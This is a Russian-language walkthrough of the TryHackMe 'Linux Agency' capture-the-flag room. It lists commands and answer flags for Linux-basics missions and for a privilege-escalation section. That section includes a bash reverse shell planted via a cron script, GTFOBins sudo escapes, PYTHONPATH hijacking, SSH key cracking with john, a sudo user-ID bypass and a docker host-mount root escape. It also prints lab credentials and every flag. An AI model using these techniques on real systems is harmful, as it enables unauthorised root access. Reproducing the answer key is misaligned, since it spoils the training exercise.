[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux Agency](https://tryhackme.com/r/room/linuxagency) 

Всего 4 задания:
## Задание 1
Добро пожаловать в Linux Agency. Агент 47, здесь вам предстоит пройти несколько тестов, касающихся основ Linux и 
методов повышения привилегий.

Эту комнату с гордостью создали 0z09e и Xyan1d3

Если вам понравилась эта комната, пожалуйста, дайте нам знать, отметив нас в Twitter. Вы также можете связаться с 
нами в случае возникновения непреднамеренных маршрутов или ошибок, и мы будем рады их устранить.

### Ответьте на вопросы ниже
Развернуть эту машину
```commandline
Ответ не нужен
```

## Задание 2
Подождите около 1 минуты, прежде чем подключаться к устройству по SSH.

Имя пользователя SSH :agent47

Пароль SSH :640509040147

Каждый найденный флаг будет служить паролем для следующего пользователя. Флаг включает имя пользователя следующего 
пользователя, который является частью этого испытания. Формат флага:username{md5sum}

Порядок пользователей: agent47 --> mission1 --> mission30 будет частью Задачи 3: Основы Linux .

После этих миссий следующие уровни будут в Задании 4: Повышение привилегий.

### Ответьте на вопросы ниже
SSH в коробке как агент47
```commandline
Ответ не нужен
```

## Задание 3
Агент 47, мы ICA, Linux Agency. Мы проверим ваши основы Linux. Давайте посмотрим, сможете ли вы пройти все эти 
испытания базового Linux. Пароль следующей миссии будет флагом этой миссии. Пример: mission1{1234567890} будет 
паролем для пользователя mission1.

Миссия активна

### Ответьте на вопросы ниже
Что такое флаг mission1?
```commandline
find / -type d -name "mission1" 2>/dev/null
find / -type f -name "mission1" 2>/dev/null
grep -r "mission1" / 2>/dev/null
grep -r mission1 * .[^.]* 2>/dev/null
```
```commandline
mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```
Что такое флаг mission2?
```commandline
su mission1
find / -type f -name "mission2" 2>/dev/null
```
```commandline
mission2{8a1b68bb11e4a35245061656b5b9fa0d}
```
Что такое флаг mission3?
```commandline
su mission2
grep -r mission3 * .[^.]* 2>/dev/null
```
```commandline
mission3{ab1e1ae5cba688340825103f70b0f976}
```
Что такое флаг mission4?
```commandline
su mission3
cd mission3
ls
nano flag.txt
```
```commandline
mission4{264a7eeb920f80b3ee9665fafb7ff92d}
```
Что такое флаг mission5?
```commandline
su mission4
grep -r "mission5" / 2>/dev/null
```
```commandline
mission5{bc67906710c3a376bcc7bd25978f62c0}
```
Что такое флаг mission6?
```commandline
su mission5
grep -r "mission6" / 2>/dev/null
```
```commandline
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```
Что такое флаг mission7?
```commandline
su mission6
grep -r "mission7" / 2>/dev/null
```
```commandline
mission7{53fd6b2bad6e85519c7403267225def5}
```
Что такое флаг mission8?
```commandline
su mission7
grep -r "mission8" / 2>/dev/null
```
```commandline
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
```
Что такое флаг mission9?
```commandline
su mission8
ls
cat flag.txt
```
```commandline
mission9{ba1069363d182e1c114bef7521c898f5}
```
Что такое флаг mission10?
```commandline
su mission9
grep -r "mission10" / 2>/dev/null
```
```commandline
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```
Что такое флаг mission11?
```commandline
su mission10
grep -r "mission11" / 2>/dev/null
```
```commandline
mission11{db074d9b68f06246944b991d433180c0}
```
Что такое флаг mission12?
```commandline
su mission11
env | grep mission12
```
```commandline
mission12{f449a1d33d6edc327354635967f9a720}
```
Что такое флаг mission13?
```commandline
su mission12
ls -la /home/mission12/flag.txt
chmod 777 /home/mission12/flag.txt
cat /home/mission12/flag.txt
```
```commandline
mission13{076124e360406b4c98ecefddd13ddb1f}
```
Что такое флаг mission14?
```commandline
su mission13
cd /home/mission13
cat flag.txt | base64 -d
```
```commandline
mission14{d598de95639514b9941507617b9e54d2}
```
Что такое флаг mission15?
```commandline
su mission14
cd missoin14
cat flag.txt
# decode bin code
```
```commandline
mission15{fc4915d818bfaeff01185c3547f25596}
```
Что такое флаг mission16?
```commandline
su misson15
cat flag.txt | xxd -r -p
```
```commandline
mission16{884417d40033c4c2091b44d7c26a908e}
```
Что такое флаг mission17?
```commandline
su mission16
chmod u+x flag
./flag
```
```commandline
mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```
Что такое флаг mission18?
```commandline
su mission17
cat flag.java
java flag
```
```commandline
mission18{f09760649986b489cda320ab5f7917e8}
```
Что такое флаг mission19?
```commandline
su mission18
ruby flag.rb
```
```commandline
mission19{a0bf41f56b3ac622d808f7a4385254b7}
```
Что такое флаг mission20?
```commandline
su mission19
cd mission19
ls
gcc flag.c -o flag
./flag
```
```commandline
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```
Что такое флаг mission21?
```commandline
su mission20
python3 flag.py
```
```commandline
mission21{7de756aabc528b446f6eb38419318f0c}
```
Что такое флаг mission22?
```commandline
mission21
script -qc /bin/bash /dev/null
```
```commandline
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```
Что такое флаг mission23?
```commandline
su mission22
import pty
pty.spawn("/bin/bash")
cd /home/mission22
cat flag.txt
```
```commandline
mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
```
Что такое флаг mission24?
```commandline
su mission23
cat message.txt
cat /etc/hosts
curl http://mission24.com -s | grep mission
```
```commandline
mission24{dbaeb06591a7fd6230407df3a947b89c}
```
Что такое флаг mission25?
```commandline
su mission24
file bribe
./bribe
grep mission .viminfo
```
```commandline
mission25{61b93637881c87c71f220033b22a921b}
```
Что такое флаг mission26?
```commandline
su mission25
ls -lhA
echo $PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ls -lhA
cat flag.txt
```
```commandline
mission26{cb6ce977c16c57f509e9f8462a120f00}
```
Что такое флаг mission27?
```commandline
su mission26
strings -n 20 flag.jpg
```
```commandline
mission27{444d29b932124a48e7dddc0595788f4d}
```
Что такое флаг mission28?
su mission27
```commandline
su mission27
ls
less flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
```
```commandline
mission28{03556f8ca983ef4dc26d2055aef9770f}
```
Что такое флаг mission29?
```commandline
su mission28
exec '/bin/bash'
cd /home/mission27
ls -lh
cat txt.galf
'}1fff2ad47eb52e68523621b8d50b2918{92noissim'.reverse
```
```commandline
mission29{8192b05d8b12632586e25be74da2fff1}
```
Что такое флаг mission30?
```commandline
su mission29
grep -rn mission30 bludit/
```
```commandline
mission30{d25b4c9fac38411d2fcb4796171bda6e}
```
Что такое флаг Виктора?
```commandline
su mission30
cd Escalator/
mission30@linuxagency:~/Escalator$ git --no-pager log
```
```commandline
viktor{b52c60124c0f8f85fe647021122b3d9a}
```

## Задание 4
Добро пожаловать в Privilege Escalation, 47. Рад, что вы зашли так далеко!!! А теперь несколько особых целей. Ваша 
цель — преподать урок этим плохим парням.

Удачи 47!!!!

Миссия активна

### Ответьте на вопросы ниже
su в пользователя viktor, используя флаг viktor в качестве пароля
```commandline
Ответ не нужен
```
Какой флаг у Далии?
```commandline
su viktor
cat /etc/crontab
cat /opt/scripts/47.sh

vim eop.sh
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/9999 0>&1

cat eop.sh | base64 -w 0
echo 'IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx' | base64 -d > /opt/scripts/47.sh
netcat -nlp 9999
id
cat /home/dalia/flag.txt
```
```commandline
dalia{4a94a7a7bb4a819a63a33979926c77dc}
```
Какой флаг у Сильвио?
```commandline
sudo -l
TF=$(mktemp -u)
sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
export TERM=xterm
export SHELL=bash
stty raw -echo
fg
cat /home/silvio/flag.txt
```
```commandline
silvio{657b4d058c03ab9988875bc937f9c2ef}
```
Какой флаг у Резы?
```commandline
sudo -l
gtfoblookup linux sudo git
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
id
cd /home/reza
cat flag.txt
```
```commandline
reza{2f1901644eda75306f3142d837b80d3e}
```
Какой флаг у Иордании?
```commandline
sudo -l
sudo -u jordan /opt/scripts/Gun-Shop.py
mkdir -p /tmp/shop; echo 'import os; os.system("/bin/bash");' > /tmp/shop/shop.py
sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
'}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj'.reverse
```
```commandline
jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
```
Какой флаг у Кена?
```commandline
sudo -l
sudo -u ken /usr/bin/less /etc/os-release
cd /home/jordan 
id
cat flag.txt
```
```commandline
ken{4115bf456d1aaf012ed4550c418ba99f}
```
Какой флаг у Шона?
```commandline
sudo -l
sudo -u sean vim
grep -r 'sean{' /var/log 2>/dev/null
```
```commandline
sean{4c5685f4db7966a43cf8e95859801281}
```
Какой флаг у Пенелопы?
```commandline
printf %s 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d
# p3nelope
su penelope
cd /home/sean
id
cat flag.txt
```
```commandline
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
```
Какой флаг у майи?
```commandline
ls -lhA
gtfoblookup linux suid base64
LFILE=/home/maya/flag.txt
./base64 "$LFILE" | base64 -d
```
```commandline
maya{a66e159374b98f64f89f7c8d458ebb2b}
```
Какова парольная фраза Роберта?
```commandline
su maya
cd /home/penelope
ls -lhA
ls -lhA old_robert_ssh
cat old_robert_ssh/id_rsa
sed 's/decodestring/decodebytes/' /usr/bin/ssh2john | python3.9 - id_rsa_robert
ssh2john id_rsa_robert
john robert_ssh.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=ssh
su robert
ss -nlpt | grep 22
ssh robert@<IP> -p 2222 -i olold_robert_ssh/id_rsa
id
cat robert.txt
```
```commandline
industryweapon
```
Что такое user.txt?
```commandline
sudo --version
sudo -u#-l /bin/bash
whoami
cd /root
cat user.tx
```
```commandline
user{620fb94d32470e1e9dcf8926481efc96}
```
Что такое root.txt?
```commandline
./docker ps -a
./docker image ls
./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
id
cat /root/root.txt
```
```commandline
root{62ca2110ce7df377872dd9f0797f8476}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)